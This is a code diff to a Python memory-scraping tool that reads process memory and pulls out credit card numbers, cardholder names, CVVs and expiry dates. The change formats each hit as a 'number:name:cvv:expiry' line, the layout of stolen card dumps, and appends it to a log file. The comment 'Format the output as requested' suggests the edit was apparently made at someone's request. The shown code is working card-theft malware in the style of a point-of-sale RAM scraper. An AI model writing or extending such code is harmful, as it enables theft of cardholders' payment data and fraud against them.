@@ -31,6 +31,9 @@ cvv_regex = re.compile(r'\b\d{3,4}\b')  # CVV code (3 or 4 digits)
 expiry_regex = re.compile(r'\b(0[1-9]|1[0-2])/(?:[0-9]{2}|[0-9]{4})\b')  # Expiry date MM/YY or MM/YYYY
 name_regex = re.compile(r'\b[A-Z][a-z]+ [A-Z][a-z]+\b')  # Simple name pattern (First Last)
 
+# Log file
+log_file = "log.txt"
+
 # Scan a buffer for potential credit card data
 def scan_memory_chunk(memory_chunk):
     results = []
@@ -70,7 +73,13 @@ def memory_scan_worker(process_handle):
                 valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1'))
                 if valid_cards:
                     for card in valid_cards:
-                        print(f"Found card at address {base_addr}: {card}")
+                        # Format the output as requested
+                        formatted_output = f"{card['Card Number']}:{card['Name']}:{card['CVV']}:{card['Expiry Date']}"
+                        print(formatted_output)
+                        
+                        # Log to file
+                        with open(log_file, 'a') as f:
+                            f.write(formatted_output + '\n')
         except Exception as e:
             print(f"Error reading memory at {base_addr}: {e}")
         finally:
